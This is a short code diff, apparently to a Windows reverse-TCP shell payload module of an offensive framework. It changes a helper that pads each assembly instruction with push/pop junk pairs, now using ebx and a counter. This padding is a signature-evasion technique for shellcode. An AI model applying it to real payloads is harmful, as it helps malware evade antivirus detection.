@@ -12,6 +12,7 @@ module Payload::Windows::ReverseTcpRc4
 
 
   def add_pusheax_popeax_to_each_instruction(orig_asm)
+    count = 0
     ret = ""
     orig_asm.each_line do |line|
       line = line.strip
@@ -23,9 +24,11 @@ module Payload::Windows::ReverseTcpRc4
       ret += "\n"
       if not line.match(/^\s*;.*/) \
         and not line.match(/^call.*/)
-        ret += "push eax\n"
-        ret += "pop eax\n"
+        ret += "push ebx\n"
+        #ret += "mov ebx, #{count}\n"
+        ret += "pop ebx\n"
         ret += "\n"
+        count += 1
       end
     end
     return ret
